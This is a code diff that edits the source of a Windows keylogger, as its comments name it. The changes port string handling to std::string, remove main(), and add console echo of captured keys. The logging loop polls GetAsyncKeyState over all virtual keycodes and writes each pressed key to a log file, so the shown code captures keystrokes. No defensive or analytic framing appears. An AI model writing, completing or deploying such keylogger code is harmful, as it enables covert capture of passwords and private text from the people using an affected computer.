@@ -3,18 +3,16 @@
 #include <stdbool.h>
 #include <unistd.h>
 #include <conio.h>
+#include <string>
+#include <iostream>
 
-char *convertToString(unsigned int i);
+using namespace std;
+
+string convertToString(unsigned int i);
 
 void beginLogging();
 
 void endLogging();
-
-int main() {
-    printf("Hello, World!\n");
-    beginLogging();
-    return 0;
-}
 
 /**
  * converts a virtual keycode to string representation
@@ -156,7 +154,7 @@ string convertToString(UINT i) {
     }
 
 
-    return NULL;
+    return "";
 }
 
 /**Determines wether the keylogger should keep logging
@@ -176,17 +174,17 @@ void beginLogging() {
         //if it returns 0x00 then nothing is pressed
         if (GetAsyncKeyState(i) != 0x00) {
             //gets a string representing the key pressed
-            char * c = convertToString(i);
+            string c = convertToString(i);
             //if c is null either an error occurred or the key isnt yet supported
-            if(c != NULL) {
+            if(c.compare("") != 0) {
                 //anything you  want to do with this should be done here
-                fprintf(fd,"%s\n", c);
+                fprintf(fd,"%s\n", c.c_str());
+				printf("%s\n", c.c_str());
 				fflush(fd);
             }
         }
         //could be a better fix for this but without this delay it spits out multiple false positives because key is
         // probably still pressed within the time that its checking
-        usleep(2);
         if (i == 254) {
             //254 is highest value for virtual keycode
             if (!keepLogging) {
@@ -194,6 +192,7 @@ void beginLogging() {
                 break;
             }
             //reset i and go again
+			usleep(5);
             i = 0;
         }
     }
